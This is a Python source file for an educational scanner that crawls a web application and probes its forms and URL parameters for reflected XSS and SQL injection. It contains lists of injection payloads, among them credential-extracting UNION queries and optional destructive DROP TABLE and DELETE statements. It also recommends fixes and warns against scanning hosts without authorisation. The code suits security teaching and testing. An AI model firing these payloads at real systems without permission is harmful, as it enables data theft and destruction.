"""
Web Security Scanner — phát hiện Reflected XSS và SQL Injection.
Chỉ quét hệ thống bạn được phép kiểm thử (lab local).
"""

import argparse
import json
import re
import sys
import time
from datetime import datetime
from urllib.parse import parse_qs, urljoin, urlparse

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(document.cookie)</script>",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert(1)>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
]

SQLI_PAYLOADS_DEFAULT = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "1 OR 1=1",
    "1' ORDER BY 1 --",
    "1' ORDER BY 999 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT 1,2,3,4,5,6,7 --",
    "' UNION SELECT username,password,email,role,1,2,3 FROM users --",
]

SQLI_PAYLOADS_DANGEROUS = [
    "'; DROP TABLE products; --",
    "'; DELETE FROM products; --",
]

SQL_ERROR_SIGNATURES = [
    "sqlite3.operationalerror",
    "sqlite3.programmingerror",
    "syntax error",
    "unrecognized token",
    "no such column",
    "near \"",
    "operationalerror",
    "programmingerror",
    "sql syntax",
    "unclosed quotation mark",
]

BOOLEAN_TRUE_HINTS = ("' OR '1'='1", "' OR 1=1", "1 OR 1=1", "\" OR \"1\"=\"1")
BOOLEAN_FALSE_HINTS = ("' AND 1=2", "' AND '1'='2", "AND 1=2 --")

RECOMMENDATIONS = {
    "Reflected XSS": "Escape output (html.escape) hoặc bật Jinja2 autoescape; validate input.",
    "SQL Injection": "Dùng parameterized query / prepared statement; không nối chuỗi SQL.",
}

ETHICAL_BANNER = """
+==================================================================+
|  WEB SECURITY SCANNER - AppSec Educational Lab                  |
|  Chi quet he thong ban duoc phep kiem thu (localhost/lab).      |
|  Khong su dung cong cu nay de tan cong website bat hop phap.    |
+==================================================================+
"""


class WebSecurityScanner:
    def __init__(self, base_url: str, timeout: int = 10, verbose: bool = False,
                 dangerous: bool = False):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.verbose = verbose
        self.dangerous = dangerous
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (AppSec-Scanner/1.0 - Educational Lab)"
        })
        self.findings = []
        self.crawled = []
        self._finding_keys = set()

    def _sqli_payloads(self):
        payloads = list(SQLI_PAYLOADS_DEFAULT)
        if self.dangerous:
            payloads.extend(SQLI_PAYLOADS_DANGEROUS)
        return payloads

    def crawl(self):
        self._print_section("BUOC 1: THU THAP ENDPOINTS (Crawler)")
        url = self.base_url + "/"
        try:
            resp = self.session.get(url, timeout=self.timeout)
            resp.raise_for_status()
        except requests.RequestException as e:
            self._print_error(f"Khong the ket noi den {url}: {e}")
            sys.exit(1)

        soup = BeautifulSoup(resp.text, "html.parser")

        forms = soup.find_all("form")
        self._print_info(f"Tim thay {len(forms)} form")
        for form in forms:
            action = form.get("action") or "/"
            method = form.get("method", "get").lower()
            inputs = [
                {
                    "name": i.get("name"),
                    "type": i.get("type", "text"),
                    "value": i.get("value", ""),
                }
                for i in form.find_all("input")
                if i.get("name")
            ]
            full_url = urljoin(self.base_url, action)
            # Bo qua endpoint /safe/* khi crawl (chi demo fix, khong phai muc tieu quet)
            if "/safe/" in full_url:
                continue
            endpoint = {
                "type": "form",
                "url": full_url,
                "method": method,
                "params": inputs,
            }
            self.crawled.append(endpoint)
            self._print_ok(f"  [FORM] {method.upper()} {full_url}")
            for inp in inputs:
                self._print_ok(f"         input[name={inp['name']}]")

        seen_patterns = set()
        for link in soup.find_all("a", href=True):
            href = link["href"]
            full = urljoin(self.base_url, href)
            parsed = urlparse(full)
            if not parsed.query or "/safe/" in parsed.path:
                continue
            qs_params = list(parse_qs(parsed.query).keys())
            pattern_key = (parsed.path, tuple(sorted(qs_params)))
            if pattern_key in seen_patterns:
                continue
            seen_patterns.add(pattern_key)
            endpoint = {
                "type": "url_param",
                "url": f"{self.base_url}{parsed.path}",
                "method": "get",
                "params": [{"name": p, "type": "text", "value": ""} for p in qs_params],
            }
            self.crawled.append(endpoint)
            self._print_ok(f"  [URL]  GET {endpoint['url']}?...")
            for p in qs_params:
                self._print_ok(f"         param: {p}")

        if not self.crawled:
            self._print_info("Khong tim thay endpoint — them /search va /category thu cong")
            self.crawled = [
                {
                    "type": "manual",
                    "url": f"{self.base_url}/search",
                    "method": "get",
                    "params": [{"name": "q", "type": "text", "value": ""}],
                },
                {
                    "type": "manual",
                    "url": f"{self.base_url}/category",
                    "method": "get",
                    "params": [{"name": "name", "type": "text", "value": ""}],
                },
            ]
        print()
        return self.crawled

    def scan_xss(self):
        self._print_section("BUOC 2: QUET REFLECTED XSS")
        for endpoint in self.crawled:
            for param in endpoint["params"]:
                if not param.get("name"):
                    continue
                for payload in XSS_PAYLOADS:
                    self._test_xss(endpoint, param["name"], payload)
        print()

    def _test_xss(self, endpoint, param_name, payload):
        resp = self._request(endpoint, param_name, payload)
        if resp is None:
            return

        reflected = payload in resp.text
        if not reflected and payload.lower() != payload:
            reflected = payload.lower() in resp.text.lower()

        if reflected:
            evidence = self._extract_context(resp.text, payload)
            self._add_finding({
                "vuln_type": "Reflected XSS",
                "severity": "HIGH",
                "url": endpoint["url"],
                "method": endpoint["method"].upper(),
                "parameter": param_name,
                "payload": payload,
                "evidence": f"Payload reflected in HTML: {evidence[:200]}",
                "recommendation": RECOMMENDATIONS["Reflected XSS"],
                "detection_method": "reflection",
                "http_status": resp.status_code,
            })
            self._print_vuln(
                f"[XSS] {endpoint['method'].upper()} {endpoint['url']}\n"
                f"       param={param_name} payload={payload[:50]}"
            )
        elif self.verbose:
            print(Fore.WHITE + f"  [XSS miss] {param_name}={payload[:40]}")

    def scan_sqli(self):
        self._print_section("BUOC 3: QUET SQL INJECTION")
        for endpoint in self.crawled:
            if endpoint["url"].rstrip("/").endswith("/search"):
                continue
            for param in endpoint["params"]:
                if not param.get("name"):
                    continue
                baseline = self._get_baseline(endpoint, param["name"])
                false_len = self._get_response_len(endpoint, param["name"], "' AND '1'='2")
                for payload in self._sqli_payloads():
                    self._test_sqli(endpoint, param["name"], payload, baseline, false_len)
        print()

    def _get_baseline(self, endpoint, param_name) -> int:
        return self._get_response_len(endpoint, param_name, "test")

    def _get_response_len(self, endpoint, param_name, value) -> int:
        resp = self._request(endpoint, param_name, value)
        return len(resp.text) if resp else 0

    def _test_sqli(self, endpoint, param_name, payload, baseline_len, false_len):
        resp = self._request(endpoint, param_name, payload)
        if resp is None:
            return

        body_lower = resp.text.lower()
        resp_len = len(resp.text)
        len_diff = abs(resp_len - baseline_len)

        # 1) Error-based
        error_sig = next((s for s in SQL_ERROR_SIGNATURES if s in body_lower), None)
        error_based = error_sig is not None

        # 2) Boolean / length anomaly
        is_true_payload = any(h in payload for h in BOOLEAN_TRUE_HINTS)
        is_false_payload = any(h in payload for h in BOOLEAN_FALSE_HINTS)
        more_data = (
            is_true_payload
            and baseline_len > 0
            and resp_len > max(baseline_len, false_len) * 1.25
        )
        boolean_based = more_data or (
            is_false_payload and false_len > 0 and resp_len < baseline_len * 0.85
        )

        # 3) Union / response anomaly
        union_based = (
            "union" in payload.lower()
            and (len_diff > 300 or "admin" in body_lower or "users" in body_lower)
        )

        if not (error_based or boolean_based or union_based):
            if self.verbose:
                print(Fore.WHITE + f"  [SQLi miss] {param_name}={payload[:40]}")
            return

        if error_based:
            method = f"error-based (signature: {error_sig})"
            severity = "CRITICAL"
        elif union_based:
            method = f"union/response anomaly (delta {len_diff} bytes)"
            severity = "CRITICAL"
        else:
            method = (
                f"boolean/length anomaly (baseline={baseline_len}, "
                f"response={resp_len}, false={false_len})"
            )
            severity = "HIGH"

        self._add_finding({
            "vuln_type": "SQL Injection",
            "severity": severity,
            "url": endpoint["url"],
            "method": endpoint["method"].upper(),
            "parameter": param_name,
            "payload": payload,
            "evidence": method,
            "recommendation": RECOMMENDATIONS["SQL Injection"],
            "detection_method": method.split("(")[0].strip(),
            "http_status": resp.status_code,
            "response_len": resp_len,
            "baseline_len": baseline_len,
        })
        self._print_vuln(
            f"[SQLi] {endpoint['method'].upper()} {endpoint['url']}\n"
            f"       param={param_name} | {method}"
        )

    def _request(self, endpoint, param_name, value):
        url = endpoint["url"]
        method = endpoint["method"]
        try:
            if method == "get":
                return self.session.get(
                    url, params={param_name: value}, timeout=self.timeout
                )
            return self.session.post(
                url, data={param_name: value}, timeout=self.timeout
            )
        except requests.RequestException as e:
            if self.verbose:
                self._print_error(f"Request error: {e}")
            return None

    def _add_finding(self, finding: dict):
        key = (finding["vuln_type"], finding["url"], finding["parameter"])
        if key in self._finding_keys:
            return
        self._finding_keys.add(key)
        self.findings.append(finding)

    def get_deduped_findings(self):
        return list(self.findings)

    def report(self, output_file: str = None):
        self._print_section("BUOC 4: BAO CAO KET QUA")
        findings = self.get_deduped_findings()
        lines = self._build_report_lines(findings)

        for line in lines:
            safe = line.encode("ascii", errors="replace").decode("ascii")
            if any(x in safe for x in ("XSS]", "SQLi]", "TONG LO HO")):
                print(Fore.RED + safe)
            elif "Fix" in safe or "Khong phat hien" in safe:
                print(Fore.GREEN + safe)
            elif safe.startswith("=") or safe.startswith("-"):
                print(Fore.CYAN + safe)
            else:
                print(safe)

        if output_file:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            print(Fore.GREEN + f"\n[OK] Bao cao TXT: {output_file}")

        return findings

    def export_json(self, json_file: str):
        findings = self.get_deduped_findings()
        data = {
            "target": self.base_url,
            "scan_time": datetime.now().isoformat(),
            "endpoints_crawled": len(self.crawled),
            "dangerous_mode": self.dangerous,
            "findings": findings,
        }
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(Fore.GREEN + f"[OK] Bao cao JSON: {json_file}")

    def _build_report_lines(self, findings):
        lines = [
            "=" * 70,
            "  WEB SECURITY SCANNER - KET QUA QUET",
            f"  Target      : {self.base_url}",
            f"  Thoi gian   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"  Endpoints   : {len(self.crawled)}",
            f"  Dangerous   : {self.dangerous}",
            "=" * 70,
        ]
        if not findings:
            lines.append("\n  Khong phat hien lo hong (hoac target da duoc bao ve).")
        else:
            xss = [f for f in findings if f["vuln_type"] == "Reflected XSS"]
            sqli = [f for f in findings if f["vuln_type"] == "SQL Injection"]
            lines.append(f"\n  TONG LO HO PHAT HIEN: {len(findings)}")
            lines.append(f"     - Reflected XSS  : {len(xss)}")
            lines.append(f"     - SQL Injection  : {len(sqli)}")

            for group_name, group in [("XSS", xss), ("SQLi", sqli)]:
                if not group:
                    continue
                lines.append("\n" + "-" * 70)
                lines.append(f"  [{group_name}]")
                lines.append("-" * 70)
                for i, f in enumerate(group, 1):
                    lines.append(f"\n  #{i} Severity      : {f['severity']}")
                    lines.append(f"      URL           : {f['method']} {f['url']}")
                    lines.append(f"      Parameter     : {f['parameter']}")
                    lines.append(f"      Payload       : {f['payload']}")
                    lines.append(f"      Detection     : {f.get('detection_method', '-')}")
                    lines.append(f"      Evidence      : {f['evidence']}")
                    lines.append(f"      Recommendation: {f['recommendation']}")
                    lines.append(f"      HTTP Status   : {f.get('http_status', '-')}")

        lines.append("\n" + "=" * 70)
        lines.append("  END OF REPORT")
        lines.append("=" * 70)
        return lines

    def _extract_context(self, html: str, payload: str, window: int = 80) -> str:
        idx = html.find(payload)
        if idx == -1:
            idx = html.lower().find(payload.lower())
        if idx == -1:
            return "(payload reflected)"
        start = max(0, idx - window)
        end = min(len(html), idx + len(payload) + window)
        snippet = html[start:end].replace("\n", " ")
        return "..." + re.sub(r"\s+", " ", snippet).strip() + "..."

    def _print_section(self, title):
        print(Fore.CYAN + Style.BRIGHT + f"\n{'='*60}")
        print(Fore.CYAN + Style.BRIGHT + f"  {title}")
        print(Fore.CYAN + Style.BRIGHT + f"{'='*60}")

    def _print_ok(self, msg):
        print(Fore.GREEN + msg)

    def _print_info(self, msg):
        print(Fore.YELLOW + f"[i] {msg}")

    def _print_vuln(self, msg):
        print(Fore.RED + Style.BRIGHT + f"\n  [!] {msg}")

    def _print_error(self, msg):
        print(Fore.RED + f"[!] {msg}")


def _warn_if_external(url: str):
    host = urlparse(url).hostname or ""
    local_hosts = {"localhost", "127.0.0.1", "0.0.0.0", "::1"}
    if host not in local_hosts:
        print(Fore.RED + Style.BRIGHT +
              "\n[CANH BAO] Ban dang quet host ngoai localhost.")
        print("Chi quet he thong ban SO HUU hoac duoc CAP PHEP kiem thu.\n")


def main():
    parser = argparse.ArgumentParser(
        description="Web Security Scanner — XSS & SQL Injection (Educational Lab)"
    )
    parser.add_argument("--url", default="http://localhost:5000",
                        help="Base URL (default: http://localhost:5000)")
    parser.add_argument("--report", default=None,
                        help="Xuat bao cao TXT (vd: scan_report.txt)")
    parser.add_argument("--json", default=None,
                        help="Xuat bao cao JSON (vd: scan_report.json)")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--verbose", action="store_true",
                        help="In chi tiet moi payload")
    parser.add_argument("--dangerous", action="store_true",
                        help="Bat payload pha hoai (DROP TABLE...) — mac dinh TAT")
    args = parser.parse_args()

    print(Fore.CYAN + ETHICAL_BANNER)
    _warn_if_external(args.url)

    print(f"  Target    : {args.url}")
    print(f"  Report    : {args.report or '(khong xuat TXT)'}")
    print(f"  JSON      : {args.json or '(khong xuat JSON)'}")
    print(f"  Dangerous : {args.dangerous}")
    print(f"  Verbose   : {args.verbose}\n")

    scanner = WebSecurityScanner(
        base_url=args.url,
        timeout=args.timeout,
        verbose=args.verbose,
        dangerous=args.dangerous,
    )

    start = time.time()
    scanner.crawl()
    scanner.scan_xss()
    scanner.scan_sqli()

    if args.report:
        scanner.report(output_file=args.report)
    else:
        scanner.report()

    if args.json:
        scanner.export_json(args.json)

    print(Fore.CYAN + f"\n  Tong thoi gian: {time.time() - start:.2f} giay")


if __name__ == "__main__":
    main()
